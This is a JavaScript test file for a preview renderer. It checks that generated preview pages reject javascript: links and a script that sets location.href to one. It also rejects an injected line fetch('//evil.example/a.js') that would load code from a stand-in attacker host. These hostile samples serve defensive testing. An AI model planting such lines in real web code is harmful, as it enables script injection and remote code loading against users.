import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { materialize, readPreview } from '../materialize.js';

test('a notebook cell may mention a javascript URL without becoming a link', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-preview-cell-'));
  try {
    fs.mkdirSync(path.join(root, 'app'));
    const page = path.join(root, 'app', 'preview.html');
    fs.writeFileSync(page, '<textarea>javascript:alert(1) https://example.test</textarea><p>خلية</p>');
    const shown = readPreview(root, 'app/preview.html') ?? '';
    assert.match(shown, /خلية/);
    assert.match(shown, /javascript:alert\(1\)/);
    fs.appendFileSync(page, '<a href="javascript:void(0)">x</a>');
    assert.throws(() => readPreview(root, 'app/preview.html'), /unsafe_path/);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('a local preview script may split a scheme but may not fetch a protocol-relative URL', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-preview-relative-'));
  try {
    const desktop = materialize({ selection: { kind: 'desktop' }, workspace: root, title: 'ملاحظة' });
    assert.match(readPreview(root, desktop.relativePreview) ?? '', /ملاحظة/);
    const chromeRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-preview-popup-'));
    try {
      const chrome = materialize({ selection: { kind: 'chrome-extension' }, workspace: chromeRoot, title: 'إضافة' });
      assert.match(readPreview(chromeRoot, chrome.relativePreview) ?? '', /إضافة/);
    } finally {
      fs.rmSync(chromeRoot, { recursive: true, force: true });
    }
    const script = path.join(root, 'app', 'dist', 'preview.js');
    const original = fs.readFileSync(script, 'utf8');
    fs.writeFileSync(script, `${original}\nfetch('//evil.example/a.js');\n`);
    assert.throws(() => readPreview(root, desktop.relativePreview), /unsafe_path/);
    assert.match(fs.readFileSync(script, 'utf8'), /evil\.example/);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('a preview page refuses a javascript URL in the page or its local script', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'loam-preview-script-'));
  try {
    const prepared = materialize({ selection: { kind: 'website', subtype: 'landing' }, workspace: root, title: 'هبوط' });
    const shown = readPreview(root, prepared.relativePreview) ?? '';
    assert.match(shown, /هبوط/);
    const page = path.join(root, 'app', 'preview.html');
    const original = fs.readFileSync(page);
    fs.appendFileSync(page, '<a href="javascript:void(0)">x</a>');
    assert.throws(() => readPreview(root, 'app/preview.html'), /unsafe_path/);
    fs.writeFileSync(page, original);
    fs.writeFileSync(path.join(root, 'app', 'page.js'), 'location.href="javascript:void(0)"\n');
    fs.writeFileSync(page, '<script src="page.js"></script>');
    assert.throws(() => readPreview(root, 'app/preview.html'), /unsafe_path/);
    assert.equal(fs.readFileSync(path.join(root, 'app', 'page.js'), 'utf8').includes('javascript:'), true);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
